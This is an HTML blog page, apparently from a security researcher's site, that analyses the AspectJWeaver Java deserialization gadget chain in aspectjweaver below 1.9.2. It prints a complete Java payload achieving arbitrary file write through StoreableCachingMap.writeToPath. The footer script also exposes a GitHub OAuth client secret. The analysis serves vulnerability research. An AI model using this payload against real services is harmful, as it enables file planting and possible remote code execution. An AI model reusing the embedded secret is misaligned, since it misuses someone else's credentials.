@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        AspectJWeaver利用链分析.md - Daybr4ak&#39;s Blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> sometimes code, sometimes hack. </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar">
+            <img src="/img/Daybreak.png" />
+        </div>
+        <div class="name">
+            <i>Daybr4ak</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#AspectJWeaver-利用链分析"><span class="toc-text">AspectJWeaver 利用链分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+        <div class="index-about-mobile">
+            <i> sometimes code, sometimes hack. </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        AspectJWeaver利用链分析.md
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2021-02-23 13:51:32</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#JAVA" title="JAVA">JAVA</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h2 id="AspectJWeaver-利用链分析"><a href="#AspectJWeaver-利用链分析" class="headerlink" title="AspectJWeaver 利用链分析"></a>AspectJWeaver 利用链分析</h2><p>利用链如下：</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">HashSet.readObject()</span><br><span class="line">    HashMap.<span class="keyword">put</span>()</span><br><span class="line">        HashMap.hash()</span><br><span class="line">            TiedMapEntry.hashCode()</span><br><span class="line">                TiedMapEntry.getValue()</span><br><span class="line">                    LazyMap.<span class="keyword">get</span>()</span><br><span class="line">                        SimpleCache$StorableCachingMap.<span class="keyword">put</span>()</span><br><span class="line">                            SimpleCache$StorableCachingMap.writeToPath()</span><br><span class="line">                                FileOutputStream.<span class="built_in">write</span>()</span><br></pre></td></tr></table></figure>
+<p>该利用链利用条件需要org.aspectj:aspectjweaver在1.9.2版本以下。触发点在SimpleCache$StorableCachingMap。这里我创建的是maven项目在pom.xml中添加：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap类中我们可以看到该类为一个私有类，切继承HashMap，在该类中重写了父类的put方法。</p>
+<p><img src="/img/media/AspectJWeaver利用链分析/image-20210223101253016.png" alt="image-20210223101253016"></p>
+<p>该类在重写的put方法中调用了一个writeToPath方法，而这个利用链就是通过这个方法进行的文件写入。</p>
+<p><img src="/img/media/AspectJWeaver利用链分析/image-20210223101045501.png" alt="image-20210223101045501"></p>
+<p>在该方法中利用FileOutputStream写入文件，writeToPath接收的两个参数key为文件的路径，valueBytes则是写入到文件的内容。</p>
+<p><img src="/img/media/AspectJWeaver利用链分析/image-20210223101732662.png" alt="image-20210223101732662"></p>
+<p>到这里思路就明确了。触发点在put函数，并且该类继承自HashMap，直接利用lazymap+TiedMapEntry去触发。</p>
+<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> readObject(java.io.ObjectInputStream s)</span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">        </span><br><span class="line">        							........</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                    K key = (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                    V value = (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>利用链序列化后的内容为一个HashMap,在反序列化的时候调用HashMap.readObject()，在这里调用hash(key)而key为TiedMapEntry从而调用TiedMapEntry.hashCode()</p>
+<p><img src="/img/media/AspectJWeaver利用链分析/image-20210223112143365.png" alt="image-20210223112143365"></p>
+<p>这里调用了getValue()函数，跟进getValue()函数，进一步调用了this.map.get(this.key);方法。</p>
+<p><img src="/img/media/AspectJWeaver利用链分析/image-20210223112429478.png" alt="image-20210223112429478"></p>
+<p>而TiedMapEntry中存放的map为lazymap，key就是传入的path，在lazymap.get(key)中调用了this.map.put(key)方法。此时的map为我们构造的StoreableCachingMap，而获取的value值为this.factory.transform(key); 也就是一开始我们通过new ConstantTransformer(content)传入的内容。ConstantTransformer设置了this.iConstant的变量，而这里的this.factory.transform(key)就是获取this.iConstant的值。</p>
+<p><img src="/img/media/AspectJWeaver利用链分析/image-20210223112556146.png" alt="image-20210223112556146"></p>
+<p><img src="/img/media/AspectJWeaver利用链分析/image-20210223113515820.png" alt="image-20210223113515820"></p>
+<p>从而调用了StoreableCachingMap.put(path, content) –&gt; this.writeToPath(path, content) 从而写入文件。</p>
+<p>这里我直接用了HashMap去操作，修改值的时候需要便利，<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>中给的是使用HashSet.readObject去操作，原理都一样就是HashSet方便直接修改HashMap的值，而我这里需要遍历修改。</p>
+<p>Payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] content = Base64.decode(<span class="string">"YWhpaGloaQ=="</span>);</span><br><span class="line">    String path = <span class="string">"/tmp/1.txt"</span>;</span><br><span class="line"></span><br><span class="line">    Class aspectJWeaver = Class.forName(<span class="string">"org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap"</span>);</span><br><span class="line">    Constructor ctor = aspectJWeaver.getDeclaredConstructor(String.class, <span class="keyword">int</span>.class);</span><br><span class="line">    ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object obj = ctor.newInstance(<span class="string">""</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    Transformer transformer = <span class="keyword">new</span> ConstantTransformer(content);</span><br><span class="line"></span><br><span class="line">    Map lazyMap = LazyMap.decorate((Map)obj, transformer);</span><br><span class="line"></span><br><span class="line">    TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, path);</span><br><span class="line"></span><br><span class="line">    HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    hashMap.put(<span class="string">"foo"</span>, <span class="string">"a"</span>);</span><br><span class="line"></span><br><span class="line">    Field field = HashMap.class.getDeclaredField(<span class="string">"table"</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    Object[] array = (Object[]) field.get(hashMap);</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;array.length;i++)</span><br><span class="line">        <span class="keyword">if</span>(array[i]!=<span class="keyword">null</span>)</span><br><span class="line">            a=i;</span><br><span class="line">    Object node = array[a];</span><br><span class="line">    Field keyField = node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">    keyField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    keyField.set(node, entry);</span><br><span class="line"></span><br><span class="line">    ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">    oos.writeObject(hashMap);</span><br><span class="line">    oos.close();</span><br><span class="line">    ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray()));</span><br><span class="line">    ois.readObject();</span><br></pre></td></tr></table></figure>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> 					 ___ <span class="string">key:</span> TiedMapEntry</span><br><span class="line">HashMap---|</span><br><span class="line">					|___ <span class="string">value:</span> (<span class="keyword">int</span>)</span><br><span class="line">					</span><br><span class="line"> 					 		  ___ <span class="string">key:</span> lazymap</span><br><span class="line">TiedMapEntry---|</span><br><span class="line">					     |___ <span class="string">value:</span> <span class="string">"/tmp/123.txt"</span></span><br><span class="line">					     </span><br><span class="line"> 					 ___ <span class="string">key:</span> StoreableCachingMap</span><br><span class="line">lazymap---|</span><br><span class="line">					|___ <span class="string">value:</span> <span class="keyword">new</span> ConstantTransformer(<span class="string">"123"</span>)</span><br><span class="line">					</span><br><span class="line">StoreableCachingMap.put(<span class="string">"/tmp/123.txt"</span>,<span class="string">"123"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">this</span>.writeToPath(<span class="string">"/tmp/123.txt"</span>,<span class="string">"123"</span>.getBytes())</span><br><span class="line"></span><br><span class="line">FileOutputStream()</span><br></pre></td></tr></table></figure>
+
+        
+            <div class="donate-container">
+    <div class="donate-button">
+        <button id="donate-button">赞赏</button>
+    </div>
+    <div class="donate-img-container hide" id="donate-img-container">
+        <img id="donate-img" src="" data-src="/img/pay.jpg">
+        <p> 感谢鼓励 </p>
+    </div>
+</div>
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://github.com/daybr4ak">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-github"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span>/</span>
+        
+        <span><a href="http://pupiles.com">pupil</a></span>
+        <span>/</span>
+        
+        <span><a href="https://www.cnblogs.com/test404/">胖虎</a></span>
+        <span>/</span>
+        
+        <span><a href="https://gloxec.github.io/">hook</a></span>
+        <span>/</span>
+        
+        <span><a href="https://drops.org.cn/">Ra1ndr0op</a></span>
+        <span>/</span>
+        
+    </p>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+	    总访问量
+            <span id="busuanzi_value_site_pv"></span>次
+        </span>
+        <span id="busuanzi_container_site_uv">
+	    总访客
+            <span id="busuanzi_value_site_uv"></span>人
+        </span>
+        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
+
+<script src="/js/gitment.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+
+    // gitalk的主要参数
+        clientID: 'b2b890dbf29d011e8a47',
+        clientSecret: '45618d62e41c62c53ade7486ace5265af874fc5f',
+        repo: 'daybr4ak.github.io',
+        owner: 'daybr4ak',
+        admin: ['Daybr4ak'],
+        id: 'AspectJWeaver利用链分析.md',
+    
+    });
+    gitalk.render('comment-container');
+</script>
+<!-- <script>
+    var gitalk = new Gitalk({
+        id: 'AspectJWeaver利用链分析.md',
+        owner: 'daybr4ak',
+        repo: 'daybr4ak.github.io',
+        oauth: {
+            client_id: 'b2b890dbf29d011e8a47',
+            client_secret: '45618d62e41c62c53ade7486ace5265af874fc5f',
+        },
+    })
+    gitment.render('comment-container')
+</script> -->
+
+
+
+
+</html>
